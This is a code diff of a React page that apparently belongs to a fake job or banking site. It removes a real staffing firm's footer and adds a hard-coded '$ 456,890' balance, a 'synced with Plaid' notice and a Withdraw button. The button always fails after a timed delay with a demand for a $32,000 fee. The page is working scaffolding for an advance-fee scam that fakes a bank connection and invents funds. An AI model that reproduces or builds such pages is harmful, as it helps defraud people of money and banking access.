@@ -4,7 +4,7 @@ import './home.css';
 import moment from 'moment';
 import { useNavigate,Link , useLocation} from 'react-router-dom';
 
-
+import Nav from './dashboard/nav';
 import logo from './logo.svg';
 import social from './social.png';
 import footer from './footer.svg';
@@ -46,32 +46,31 @@ function Complete(){
     //   application data
 
     
- 
-    
+ const[amount, setAmount] = useState("$ 456,890")
+
+
+    const[loading, setLoading] = useState(false);
+    const[showError, setShowError] = useState(false);
+
+
+     function handleWithdraw(e){
+        e.preventDefault();
+
+        setLoading(true);
+        setShowError(false);
+
+        setTimeout(function() {
+            setLoading(false);
+            setShowError(true);
+        }, 3000);
+     }
 
     return(
         <>
-             <nav className="navbar containerr navbar-expand-lg navbar-light">
-                <a className="navbar-brand" href="/"><img className='mylogo' src={logo}/></a>
-                <button className="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
-                    <span className="navbar-toggler-icon"></span>
-                </button>
-                <div className="collapse navbar-collapse" id="navbarNavAltMarkup">
-                    <div className="navbar-nav ml-auto">
-                   
-                    <a className="nav-link mx-3" href="/">Home</a>
-                    {/* <a className="nav-link mx-3" href="">About Us</a>
-                    <a className="nav-link mx-3" href="#">Job Openings</a>
-                    <a className="nav-link mx-3"href="#">For Veterans</a> */}
-                    
-                    </div>
-                </div>
-                </nav>
+        <div className='row main'>
+             <Nav />
 
-                    <br></br>
-                <div className='herodivtwo py-5'>
-                   
-                </div>
+                  
 
 
                
@@ -80,8 +79,11 @@ function Complete(){
 
 
 
-                <div className='col-md-10 m-auto'>
+                <div className='col-md-9 full bg-light m-0 px-0'>
+                    <br>
+                    </br>
                    
+                   <br></br>
 
                  
 
@@ -94,15 +96,47 @@ function Complete(){
                      </div>
 
 
-                     <div className='cardtwo col-11 rounded shadow m-auto py-2'>
+{!showError &&
+                     <div className='alert alert-success col-11 rounded shadow m-auto py-2'>
 
                      <h5 className='topic'>Account Connected </h5>
 <p className='topicpara'>You have successfully sync your account with Plaid.</p>
 
                          
-<h5 className='topic'>Your data belongs to you</h5>
-<p className='topicpara'>Plaid doesn't sell personal info and will only use it with your permission</p>
+
 </div>
+}
+
+
+{showError && 
+<div className='alert alert-danger col-11 rounded shadow m-auto py-2'>
+
+<h5 className='topic'>Withdrawal Error </h5>
+<p className='topicpara'>Unable to withdraw, you need to pay a fee of $32,000 to complete the Withdrawal process</p>
+
+    
+
+</div>
+
+}
+
+<br>
+</br>
+
+
+        <form onSubmit={handleWithdraw} className='py-3'>
+            <div className='form-group'>
+            <label>Amount to Withdraw</label>
+
+<               input type="text"value={amount} className='form-control'disabled />
+            </div>
+
+            <br>
+            </br>
+
+
+            <button className='btn btn-success text-center w-100'>Withdraw</button>
+        </form>
 
 
           
@@ -132,26 +166,8 @@ function Complete(){
                 </div>
 
 
-                <hr className='footerhr mt-5' />
-
-                 <section className='footer containerr'>
-
-                     <img className='mylogo' src={footer} />
-
-                     <div>
-                         <p className='small'>©2024 Vaco | All Rights Reserved</p>
-                         <p className='small'>Vaco Global Headquarters: 5501 Virginia Way #120, Brentwood, TN 37027</p>
-                         <p className='small'><a>Privacy policy</a> | <a>Fraud Policy</a> | <a>EEO Notice</a></p>
-                     </div>
-
-
-                    <img className='social'src={social} />
-                 </section>
-
-
-
-                 
                 
+                </div>
 
         </>
     );
